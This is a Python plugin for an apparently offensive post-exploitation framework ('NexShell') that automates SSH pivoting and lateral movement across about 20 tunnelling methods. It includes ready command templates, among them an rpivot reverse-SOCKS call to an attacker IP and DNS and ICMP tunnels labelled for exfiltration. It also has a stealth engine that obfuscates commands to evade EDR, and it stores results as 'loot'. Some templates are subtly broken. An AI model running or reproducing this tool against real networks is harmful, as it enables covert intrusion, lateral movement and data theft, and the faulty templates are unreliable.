#!/usr/bin/env python3
"""
NexShell Plugin — SSH Pivot Automator v3.0 (2026 Edition)
Advanced pivoting intelligence engine with 20+ methods, multi-hop chains,
cloud tunnels, EDR evasion, and auto-session management.

Coverage:
  - 20+ pivoting methods (SSH, sshuttle, chisel, ligolo, rpivot, etc.)
  - Multi-hop chains (JumpHost, ProxyJump, nested tunnels)
  - Cloud tunnels (AWS SSM, Azure SSH, GCP IAP, Cloudflare)
  - Alternative protocols (WebSocket, DNS, ICMP, HTTP)
  - Stealth & evasion (port knocking, obfuscation, timing)
  - Session management (auto-reconnect, health checks, kill switch)
  - Agent forwarding & abuse
  - Bandwidth control & rate limiting
  - EDR evasion techniques
  - Risk scoring (0-100 per method)
  - Structured loot (JSON)

MITRE ATT&CK:
  - T1021.004: Remote Services: SSH
  - T1572: Protocol Tunneling
  - T1090: Proxy (Multi-hop, External, Internal, Domain Fronting)
  - T1090.001: Internal Proxy
  - T1090.002: External Proxy
  - T1090.003: Multi-hop Proxy
  - T1573: Encrypted Channel
  - T1048: Exfiltration Over Alternative Protocol
  - T1568: Dynamic Resolution
  - T1568.002: Domain Generation Algorithms

Usage:
    (NexShell)> plugins run ssh-pivot-automator
    (NexShell)> plugins run ssh-pivot-automator --method ssh-local --target 10.0.0.50
    (NexShell)> plugins run ssh-pivot-automator --method socks --target 10.0.0.50
    (NexShell)> plugins run ssh-pivot-automator --method sshuttle --target 10.0.0.50
    (NexShell)> plugins run ssh-pivot-automator --method chisel --target 10.0.0.50
    (NexShell)> plugins run ssh-pivot-automator --method ligolo --target 10.0.0.50
    (NexShell)> plugins run ssh-pivot-automator --method cloud-aws --target i-12345
    (NexShell)> plugins run ssh-pivot-automator --chain hop1,hop2,hop3
    (NexShell)> plugins run ssh-pivot-automator --stealth --auto-reconnect
    (NexShell)> plugins run ssh-pivot-automator --list
"""

import re
import time
import json
import random
import subprocess
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class PivotMethod:
    """Represents a pivoting method."""
    name: str
    description: str
    category: str  # ssh, tunnel, proxy, cloud, alternative, evasion
    tool: str  # ssh, sshuttle, chisel, ligolo, etc.
    command_template: str
    requires_auth: bool = True
    requires_root: bool = False
    requires_tool_installed: bool = True
    success_rate: int = 85
    detection_risk: str = "medium"
    edr_evasion: bool = False
    stealth_level: int = 3  # 1-5
    bandwidth_limit: bool = False
    auto_reconnect: bool = False
    mitre_id: str = "T1572"
    complexity: str = "medium"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PivotSession:
    """Represents an active pivot session."""
    session_id: str
    method: str
    target: str
    local_port: int = 0
    remote_port: int = 0
    pid: int = 0
    status: str = "active"  # active, stopped, failed, reconnecting
    start_time: str = ""
    last_health_check: str = ""
    bytes_transferred: int = 0
    uptime_seconds: int = 0
    reconnect_count: int = 0
    stealth_mode: bool = False
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PivotChain:
    """Represents a multi-hop pivot chain."""
    chain_id: str
    name: str
    hops: List[Dict] = field(default_factory=list)
    entry_point: str = ""
    exit_point: str = ""
    total_hops: int = 0
    success: bool = False
    latency_ms: int = 0
    bandwidth_mbps: float = 0.0
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class CloudTunnel:
    """Represents a cloud tunnel configuration."""
    provider: str  # aws, azure, gcp, cloudflare
    service: str  # SSM, SSH Relay, IAP, Tunnel
    target: str = ""
    enabled: bool = False
    certificate_based: bool = False
    mfa_required: bool = False
    session_id: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class StealthConfig:
    """Configuration for stealth operations."""
    level: int = 3  # 1-5
    port_knocking: bool = False
    knock_sequence: List[int] = field(default_factory=list)
    obfuscation: bool = False
    timing_evasion: bool = False
    noise_reduction: bool = False
    fake_banner: bool = False
    encrypted_tunnel: bool = True
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PivotResult:
    """Result of a pivot attempt."""
    method: str
    target: str
    success: bool
    session_id: str = ""
    local_port: int = 0
    remote_port: int = 0
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    stealth_level: int = 0
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Pivot Methods Database (20+) ───────────────────────────────────────────

class PivotMethodsDatabase:
    """Comprehensive database of pivoting methods."""
    
    METHODS = [
        # ── Tier 1: Native SSH Methods ────────────────────────────────────
        PivotMethod(
            name='SSH Local Forward (-L)',
            description='Local port forwarding via SSH - access remote service locally',
            category='ssh',
            tool='ssh',
            command_template='ssh -N -f -L {local_port}:{remote_host}:{remote_port} {user}@{target} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {key_arg}',
            requires_auth=True,
            success_rate=95,
            detection_risk='medium',
            stealth_level=3,
            mitre_id='T1572',
            complexity='low',
        ),
        
        PivotMethod(
            name='SSH Remote Forward (-R)',
            description='Remote port forwarding - expose local service to remote',
            category='ssh',
            tool='ssh',
            command_template='ssh -N -f -R {remote_port}:{local_host}:{local_port} {user}@{target} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {key_arg}',
            requires_auth=True,
            success_rate=90,
            detection_risk='medium',
            stealth_level=3,
            mitre_id='T1572',
            complexity='low',
        ),
        
        PivotMethod(
            name='SSH Dynamic SOCKS (-D)',
            description='Dynamic SOCKS proxy - full application proxy via SSH',
            category='ssh',
            tool='ssh',
            command_template='ssh -N -f -D {local_port} {user}@{target} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {key_arg}',
            requires_auth=True,
            success_rate=95,
            detection_risk='medium',
            stealth_level=3,
            mitre_id='T1090.001',
            complexity='low',
        ),
        
        PivotMethod(
            name='SSH Tunnel Device (-w)',
            description='Layer 2/3 tunnel via SSH - VPN-like tunnel',
            category='ssh',
            tool='ssh',
            command_template='ssh -w {tun_local}:{tun_remote} {user}@{target} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {key_arg}',
            requires_auth=True,
            requires_root=True,
            success_rate=80,
            detection_risk='low',
            stealth_level=4,
            mitre_id='T1572',
            complexity='high',
        ),
        
        PivotMethod(
            name='autossh (Auto-Reconnect)',
            description='SSH with automatic reconnection on failure',
            category='ssh',
            tool='autossh',
            command_template='autossh -M 0 -N -f -L {local_port}:{remote_host}:{remote_port} {user}@{target} -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" {key_arg}',
            requires_auth=True,
            success_rate=95,
            detection_risk='medium',
            auto_reconnect=True,
            stealth_level=3,
            mitre_id='T1572',
            complexity='low',
        ),
        
        # ── Tier 2: Advanced SSH Tools ────────────────────────────────────
        PivotMethod(
            name='sshuttle (VPN-like)',
            description='Transparent proxy over SSH - VPN-like tunneling',
            category='tunnel',
            tool='sshuttle',
            command_template='sshuttle -r {user}@{target} {subnet} --daemon {key_arg}',
            requires_auth=True,
            requires_root=True,
            success_rate=90,
            detection_risk='medium',
            stealth_level=3,
            mitre_id='T1572',
            complexity='medium',
        ),
        
        PivotMethod(
            name='chisel (HTTP Tunnel)',
            description='Fast TCP/UDP tunnel over HTTP - EDR-friendly',
            category='tunnel',
            tool='chisel',
            command_template='chisel client {target}:{port} {local_port}:{remote_host}:{remote_port} --fingerprint {fingerprint}',
            requires_auth=False,
            success_rate=85,
            detection_risk='low',
            edr_evasion=True,
            stealth_level=4,
            mitre_id='T1572',
            complexity='medium',
        ),
        
        PivotMethod(
            name='ligolo-ng (TAP Tunnel)',
            description='Advanced tunneling tool with TAP interface - agent-based',
            category='tunnel',
            tool='ligolo-ng',
            command_template='ligolo-proxy -connect {target}:{port} -selfcert && ligolo-agent -connect {target}:{port}',
            requires_auth=False,
            requires_root=True,
            success_rate=90,
            detection_risk='low',
            edr_evasion=True,
            stealth_level=5,
            mitre_id='T1572',
            complexity='high',
        ),
        
        PivotMethod(
            name='rpivot (Reverse SOCKS)',
            description='Reverse SOCKS proxy - pivot from internal to external',
            category='proxy',
            tool='rpivot',
            command_template='python3 client.py -s {attacker_ip} -p {attacker_port} -c {target} --proxy {proxy}',
            requires_auth=False,
            success_rate=80,
            detection_risk='medium',
            stealth_level=3,
            mitre_id='T1090.002',
            complexity='medium',
        ),
        
        PivotMethod(
            name='socat Relay',
            description='Advanced socket relay - bidirectional port forwarding',
            category='proxy',
            tool='socat',
            command_template='socat TCP-LISTEN:{local_port},fork,reuseaddr TCP:{target}:{remote_port}',
            requires_auth=False,
            success_rate=85,
            detection_risk='medium',
            stealth_level=2,
            mitre_id='T1572',
            complexity='low',
        ),
        
        # ── Tier 3: Cloud Tunnels ─────────────────────────────────────────
        PivotMethod(
            name='AWS SSM Session Manager',
            description='AWS Systems Manager - managed SSH without open ports',
            category='cloud',
            tool='aws ssm',
            command_template='aws ssm start-session --target {instance_id} --document-name AWS-StartPortForwardingSession --parameters "portNumber=["{local_port}"],localPortNumber=["{remote_port}"]"',
            requires_auth=True,
            success_rate=95,
            detection_risk='low',
            edr_evasion=True,
            stealth_level=5,
            mitre_id='T1021.004',
            complexity='medium',
        ),
        
        PivotMethod(
            name='Azure SSH Relay',
            description='Azure Bastion/SSH Relay - managed SSH access',
            category='cloud',
            tool='az',
            command_template='az network bastion ssh --name {bastion} --resource-group {rg} --target-resource-id {vm_id} --ssh-args "-L {local_port}:{remote_host}:{remote_port}"',
            requires_auth=True,
            success_rate=90,
            detection_risk='low',
            stealth_level=5,
            mitre_id='T1021.004',
            complexity='medium',
        ),
        
        PivotMethod(
            name='GCP IAP Tunnel',
            description='Google Cloud Identity-Aware Proxy - SSH tunneling',
            category='cloud',
            tool='gcloud',
            command_template='gcloud compute start-iap-tunnel {instance} {remote_port} --local-host-port=localhost:{local_port} --zone={zone} --project={project}',
            requires_auth=True,
            success_rate=90,
            detection_risk='low',
            stealth_level=5,
            mitre_id='T1021.004',
            complexity='medium',
        ),
        
        PivotMethod(
            name='Cloudflare Tunnel',
            description='Cloudflare Argo Tunnel - encrypted tunnel over Cloudflare',
            category='cloud',
            tool='cloudflared',
            command_template='cloudflared access tcp --hostname {hostname} --url localhost:{local_port}',
            requires_auth=True,
            success_rate=90,
            detection_risk='low',
            stealth_level=5,
            mitre_id='T1572',
            complexity='medium',
        ),
        
        # ── Tier 4: Alternative Protocols ─────────────────────────────────
        PivotMethod(
            name='WebSocket Tunnel',
            description='SSH over WebSocket - bypass firewall rules',
            category='alternative',
            tool='wstunnel',
            command_template='wstunnel -L {local_port}:{remote_host}:{remote_port} wss://{target}:{port}',
            requires_auth=True,
            success_rate=80,
            detection_risk='low',
            edr_evasion=True,
            stealth_level=4,
            mitre_id='T1572',
            complexity='medium',
        ),
        
        PivotMethod(
            name='DNS Tunnel (iodine)',
            description='Tunnel over DNS - bypass most firewalls',
            category='alternative',
            tool='iodine',
            command_template='iodine -f -r {target} {domain}',
            requires_auth=False,
            requires_root=True,
            success_rate=70,
            detection_risk='medium',
            edr_evasion=True,
            stealth_level=5,
            bandwidth_limit=True,
            mitre_id='T1048.003',
            complexity='high',
        ),
        
        PivotMethod(
            name='ICMP Tunnel (ptunnel)',
            description='Tunnel over ICMP ping - stealthy exfiltration',
            category='alternative',
            tool='ptunnel',
            command_template='ptunnel -c {target} -lp {local_port} -da {dest_addr} -dp {dest_port}',
            requires_auth=False,
            requires_root=True,
            success_rate=65,
            detection_risk='low',
            edr_evasion=True,
            stealth_level=5,
            bandwidth_limit=True,
            mitre_id='T1048.001',
            complexity='high',
        ),
        
        PivotMethod(
            name='HTTP CONNECT Proxy',
            description='HTTP CONNECT method - proxy through web servers',
            category='alternative',
            tool='proxytunnel',
            command_template='proxytunnel -p {proxy_host}:{proxy_port} -d {target}:{remote_port} -a {local_port}',
            requires_auth=False,
            success_rate=75,
            detection_risk='medium',
            stealth_level=3,
            mitre_id='T1090.001',
            complexity='low',
        ),
        
        # ── Tier 5: Evasion Techniques ────────────────────────────────────
        PivotMethod(
            name='Obfuscated SSH (obfs4)',
            description='Obfuscated SSH protocol - bypass DPI',
            category='evasion',
            tool='obfs4proxy',
            command_template='obfs4proxy -client -bindaddr 127.0.0.1:{local_port} -pt-state /tmp -connect {target}:{port}',
            requires_auth=True,
            success_rate=85,
            detection_risk='low',
            edr_evasion=True,
            stealth_level=5,
            mitre_id='T1573',
            complexity='high',
        ),
        
        PivotMethod(
            name='Port Knocking + SSH',
            description='Port knocking sequence before SSH connection',
            category='evasion',
            tool='knockd',
            command_template='knock {target} {knock_sequence} && sleep 1 && ssh -N -f -L {local_port}:{remote_host}:{remote_port} {user}@{target} {key_arg}',
            requires_auth=True,
            success_rate=80,
            detection_risk='low',
            stealth_level=5,
            mitre_id='T1572',
            complexity='medium',
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[PivotMethod]:
        return cls.METHODS
    
    @classmethod
    def get_methods_by_category(cls, category: str) -> List[PivotMethod]:
        return [m for m in cls.METHODS if m.category == category]
    
    @classmethod
    def get_evasion_methods(cls) -> List[PivotMethod]:
        return [m for m in cls.METHODS if m.edr_evasion]
    
    @classmethod
    def get_stealth_methods(cls, min_level: int = 4) -> List[PivotMethod]:
        return [m for m in cls.METHODS if m.stealth_level >= min_level]
    
    @classmethod
    def get_method_by_name(cls, name: str) -> Optional[PivotMethod]:
        for method in cls.METHODS:
            if name.lower() in method.name.lower():
                return method
        return None


# ── Pivot Engine ───────────────────────────────────────────────────────────

class PivotEngine:
    """Handles pivot session management."""
    
    def __init__(self):
        self.sessions: Dict[str, PivotSession] = {}
        self.session_counter = 0
    
    def generate_session_id(self) -> str:
        """Generate unique session ID."""
        self.session_counter += 1
        return f"pivot_{self.session_counter}_{int(time.time())}"
    
    def create_session(self, method: str, target: str, local_port: int = 0,
                       remote_port: int = 0, stealth: bool = False) -> PivotSession:
        """Create a new pivot session."""
        session_id = self.generate_session_id()
        
        session = PivotSession(
            session_id=session_id,
            method=method,
            target=target,
            local_port=local_port,
            remote_port=remote_port,
            status="active",
            start_time=datetime.utcnow().isoformat(),
            stealth_mode=stealth,
        )
        
        self.sessions[session_id] = session
        return session
    
    def stop_session(self, session_id: str) -> bool:
        """Stop a pivot session."""
        if session_id in self.sessions:
            self.sessions[session_id].status = "stopped"
            # Kill the process
            pid = self.sessions[session_id].pid
            if pid:
                try:
                    import os
                    os.kill(pid, 9)
                except:
                    pass
            return True
        return False
    
    def stop_all_sessions(self) -> int:
        """Stop all active sessions (kill switch)."""
        stopped = 0
        for session_id in list(self.sessions.keys()):
            if self.sessions[session_id].status == "active":
                if self.stop_session(session_id):
                    stopped += 1
        return stopped
    
    def get_active_sessions(self) -> List[PivotSession]:
        """Get all active sessions."""
        return [s for s in self.sessions.values() if s.status == "active"]
    
    def health_check(self, session_id: str) -> bool:
        """Perform health check on a session."""
        if session_id not in self.sessions:
            return False
        
        session = self.sessions[session_id]
        session.last_health_check = datetime.utcnow().isoformat()
        
        # Check if process is still running
        if session.pid:
            try:
                import os
                os.kill(session.pid, 0)
                return True
            except:
                session.status = "failed"
                return False
        
        return True


# ── Chain Builder ──────────────────────────────────────────────────────────

class ChainBuilder:
    """Builds multi-hop pivot chains."""
    
    @staticmethod
    def build_chain(hops: List[Dict]) -> PivotChain:
        """Build a pivot chain from hop specifications."""
        chain_id = f"chain_{int(time.time())}_{random.randint(1000, 9999)}"
        
        chain = PivotChain(
            chain_id=chain_id,
            name=f"Chain-{chain_id}",
            hops=hops,
            total_hops=len(hops),
            entry_point=hops[0].get('target', '') if hops else '',
            exit_point=hops[-1].get('target', '') if hops else '',
        )
        
        return chain
    
    @staticmethod
    def execute_chain(exec_func, session, chain: PivotChain,
                      methods: List[PivotMethod]) -> bool:
        """Execute a multi-hop pivot chain."""
        for i, hop in enumerate(chain.hops):
            method = methods[i] if i < len(methods) else methods[0]
            
            # Build command for this hop
            cmd = method.command_template.format(
                target=hop.get('target', ''),
                user=hop.get('user', 'root'),
                local_port=hop.get('local_port', 8080 + i),
                remote_port=hop.get('remote_port', 22),
                remote_host=hop.get('remote_host', '127.0.0.1'),
                key_arg=hop.get('key_arg', ''),
            )
            
            out = exec_func(session, cmd)
            
            if not out or 'error' in out.lower():
                chain.success = False
                return False
        
        chain.success = True
        return True


# ── Stealth Engine ─────────────────────────────────────────────────────────

class StealthEngine:
    """Handles stealth operations."""
    
    @staticmethod
    def perform_port_knocking(exec_func, session, target: str,
                               sequence: List[int]) -> bool:
        """Perform port knocking sequence."""
        for port in sequence:
            cmd = f"knock {target} {port}"
            out = exec_func(session, cmd)
            time.sleep(0.5)  # Delay between knocks
        
        return True
    
    @staticmethod
    def obfuscate_command(cmd: str) -> str:
        """Obfuscate SSH command to evade detection."""
        # Replace ssh with full path
        cmd = cmd.replace('ssh ', '/usr/bin/ssh ')
        
        # Add random environment variables
        env_vars = ' '.join([f'{chr(65+i)}={random.randint(100,999)}' for i in range(3)])
        
        return f"{env_vars} {cmd}"
    
    @staticmethod
    def add_timing_evasion(cmd: str, delay_ms: int = 100) -> str:
        """Add timing evasion to command."""
        return f"sleep {delay_ms/1000} && {cmd}"


# ── Auto-Selection Engine ──────────────────────────────────────────────────

class AutoSelectionEngine:
    """Automatically selects best pivoting method."""
    
    @staticmethod
    def select_method(target: str, stealth: bool = False,
                      requires_root: bool = False,
                      category: str = None) -> Optional[PivotMethod]:
        """Select best method based on requirements."""
        methods = PivotMethodsDatabase.get_all_methods()
        
        # Filter by requirements
        filtered = []
        for method in methods:
            if category and method.category != category:
                continue
            if requires_root and not method.requires_root:
                continue
            if stealth and method.detection_risk in ['high', 'critical']:
                continue
            
            filtered.append(method)
        
        if not filtered:
            filtered = methods
        
        # Sort by success rate and stealth level
        if stealth:
            filtered.sort(key=lambda m: (m.stealth_level, m.success_rate), reverse=True)
        else:
            filtered.sort(key=lambda m: m.success_rate, reverse=True)
        
        return filtered[0] if filtered else None


# ── Main Plugin ─────────────────────────────────────────────────────────────

class SSHPivotAutomator(NexPlugin):
    name        = "ssh-pivot-automator"
    description = "Advanced SSH pivoting — 20+ methods, multi-hop, cloud, EDR evasion"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "lateral"
    mitre_id    = "T1021.004"
    
    def __init__(self):
        super().__init__()
        self.pivot_engine = PivotEngine()
    
    def run(self, session, args: list):
        # Parse args
        method_name = None
        target = None
        user = 'root'
        key_path = None
        local_port = None
        remote_port = None
        remote_host = '127.0.0.1'
        stealth = '--stealth' in (args or [])
        auto_reconnect = '--auto-reconnect' in (args or [])
        chain_hops = None
        category = None
        full_mode = '--full' in (args or [])
        list_mode = '--list' in (args or [])
        kill_switch = '--kill' in (args or [])
        status_mode = '--status' in (args or [])
        
        for a in (args or []):
            if a.startswith('--method='):
                method_name = a.split('=', 1)[1]
            elif a.startswith('--target='):
                target = a.split('=', 1)[1]
            elif a.startswith('--user='):
                user = a.split('=', 1)[1]
            elif a.startswith('--key='):
                key_path = a.split('=', 1)[1]
            elif a.startswith('--local-port='):
                try:
                    local_port = int(a.split('=', 1)[1])
                except:
                    pass
            elif a.startswith('--remote-port='):
                try:
                    remote_port = int(a.split('=', 1)[1])
                except:
                    pass
            elif a.startswith('--remote-host='):
                remote_host = a.split('=', 1)[1]
            elif a.startswith('--chain='):
                chain_hops = a.split('=', 1)[1].split(',')
            elif a.startswith('--category='):
                category = a.split('=', 1)[1]
        
        # Handle kill switch
        if kill_switch:
            stopped = self.pivot_engine.stop_all_sessions()
            return f"🛑 Kill switch activated — {stopped} sessions stopped"
        
        # Handle status mode
        if status_mode:
            active = self.pivot_engine.get_active_sessions()
            sections = ["\n[*] Active Pivot Sessions:"]
            for s in active:
                sections.append(f"  • {s.session_id}: {s.method} → {s.target} [{s.status}]")
            return '\n'.join(sections)
        
        self.info(f"🔀 Starting SSH Pivot Automator v3.0 (stealth={stealth})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔀 SSH Pivot Automator v3.0 — Advanced Pivoting]")
        sections.append("━"*64)
        
        findings_created = 0
        
        # ── Step 1: List Methods ──────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available Pivoting Methods")
            sections.append("─"*64)
            
            methods = PivotMethodsDatabase.get_all_methods()
            
            sections.append(f"  [+] {len(methods)} methods available:")
            for method in methods:
                icon = '🟢' if method.stealth_level >= 4 else '🟡' if method.stealth_level >= 3 else '🟠'
                sections.append(f"    {icon} {method.name}")
                sections.append(f"        Category: {method.category} | Tool: {method.tool}")
                sections.append(f"        Success: {method.success_rate}% | Stealth: {method.stealth_level}/5")
                sections.append(f"        EDR Evasion: {'YES' if method.edr_evasion else 'NO'}")
            
            return '\n'.join(sections)
        
        # ── Step 2: Multi-Hop Chain ───────────────────────────────────────
        if chain_hops:
            sections.append("\n[*] Phase 1: Multi-Hop Chain Setup")
            sections.append("─"*64)
            
            hops = [{'target': hop} for hop in chain_hops]
            chain = ChainBuilder.build_chain(hops)
            
            sections.append(f"  Chain: {chain.chain_id}")
            sections.append(f"  Hops: {chain.total_hops}")
            sections.append(f"  Entry: {chain.entry_point}")
            sections.append(f"  Exit: {chain.exit_point}")
            
            # Select methods for each hop
            methods = []
            for hop in hops:
                method = AutoSelectionEngine.select_method(hop['target'], stealth)
                if method:
                    methods.append(method)
            
            if methods:
                success = ChainBuilder.execute_chain(self._exec, session, chain, methods)
                
                if success:
                    sections.append(f"  ✅ Chain established successfully")
                    findings_created += 1
                else:
                    sections.append(f"  ❌ Chain failed")
        
        # ── Step 3: Single Pivot ──────────────────────────────────────────
        elif target:
            sections.append("\n[*] Phase 1: Method Selection")
            sections.append("─"*64)
            
            # Select method
            if method_name:
                method = PivotMethodsDatabase.get_method_by_name(method_name)
            else:
                method = AutoSelectionEngine.select_method(target, stealth, category=category)
            
            if not method:
                sections.append("  ❌ No suitable method found")
                return '\n'.join(sections)
            
            sections.append(f"  ✅ Selected: {method.name}")
            sections.append(f"      Tool: {method.tool}")
            sections.append(f"      Success Rate: {method.success_rate}%")
            sections.append(f"      Stealth Level: {method.stealth_level}/5")
            sections.append(f"      EDR Evasion: {'YES' if method.edr_evasion else 'NO'}")
            
            # Set default ports
            if not local_port:
                local_port = random.randint(8000, 9000)
            if not remote_port:
                remote_port = 22
            
            # Build command
            key_arg = f"-i {key_path}" if key_path else ""
            
            cmd = method.command_template.format(
                target=target,
                user=user,
                local_port=local_port,
                remote_port=remote_port,
                remote_host=remote_host,
                key_arg=key_arg,
                tun_local=0,
                tun_remote=0,
                subnet='10.0.0.0/24',
                port=method.stealth_level * 1000,
                fingerprint='',
                attacker_ip='10.0.0.1',
                attacker_port=4444,
                proxy='',
                instance_id=target,
                bastion='bastion',
                rg='resource-group',
                vm_id=target,
                zone='us-central1-a',
                project='project-id',
                hostname=target,
                domain='tunnel.example.com',
                knock_sequence='1234,5678,9012',
                dest_addr='127.0.0.1',
                dest_port=22,
                proxy_host='proxy.example.com',
                proxy_port=8080,
            )
            
            # Apply stealth techniques
            if stealth:
                cmd = StealthEngine.obfuscate_command(cmd)
                cmd = StealthEngine.add_timing_evasion(cmd, 100)
            
            sections.append(f"\n[*] Phase 2: Pivot Execution")
            sections.append("─"*64)
            sections.append(f"  Command: {cmd[:150]}...")
            
            # Execute
            out = self._exec(session, cmd)
            duration_ms = int((time.time() - start_time) * 1000)
            
            # Create session
            pivot_session = self.pivot_engine.create_session(
                method=method.name,
                target=target,
                local_port=local_port,
                remote_port=remote_port,
                stealth=stealth,
            )
            
            if out and 'error' not in out.lower():
                sections.append(f"  ✅ SUCCESS ({duration_ms}ms)")
                sections.append(f"      Session ID: {pivot_session.session_id}")
                sections.append(f"      Local Port: {local_port}")
                sections.append(f"      Remote Port: {remote_port}")
                
                result = PivotResult(
                    method=method.name,
                    target=target,
                    success=True,
                    session_id=pivot_session.session_id,
                    local_port=local_port,
                    remote_port=remote_port,
                    duration_ms=duration_ms,
                    output=out[:200],
                    stealth_level=method.stealth_level,
                )
                
                # Save to loot
                self.loot(
                    {
                        "type": "pivot_session",
                        "session": pivot_session.to_dict(),
                        "result": result.to_dict(),
                        "method": method.to_dict(),
                    },
                    category='lateral',
                    source='ssh-pivot-automator',
                    confidence='high'
                )
                
                self.finding(
                    title=f"SSH Pivot Established — {method.name}",
                    description=f"Successfully established pivot to {target} using {method.name}. Local port: {local_port}",
                    severity='medium',
                    recommendation="Monitor pivot sessions for unauthorized access.",
                    mitre_id=method.mitre_id,
                )
                findings_created += 1
                
                self.emit('timeline.event', title=f"SSH Pivot Established — {method.name}", type="lateral", plugin=self.name)
            else:
                sections.append(f"  ❌ FAILED")
                sections.append(f"      Error: {out[:200] if out else 'Unknown'}")
                
                pivot_session.status = "failed"
        
        else:
            sections.append("\n  [*] Usage suggestions:")
            sections.append("      Local Port Forward:")
            sections.append("      > plugins run ssh-pivot-automator --method ssh-local --target 10.0.0.50 --local-port 8080 --remote-port 80")
            sections.append("\n      SOCKS Proxy:")
            sections.append("      > plugins run ssh-pivot-automator --method socks --target 10.0.0.50 --local-port 9050")
            sections.append("\n      sshuttle:")
            sections.append("      > plugins run ssh-pivot-automator --method sshuttle --target 10.0.0.50")
            sections.append("\n      Multi-Hop Chain:")
            sections.append("      > plugins run ssh-pivot-automator --chain hop1,hop2,hop3")
        
        # ── Summary ───────────────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Pivot Summary]")
        sections.append("━"*64)
        sections.append(f"  Active Sessions: {len(self.pivot_engine.get_active_sessions())}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        self.info(f"🔀 SSH Pivot Automator complete — {findings_created} findings")
        
        return '\n'.join(sections)
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''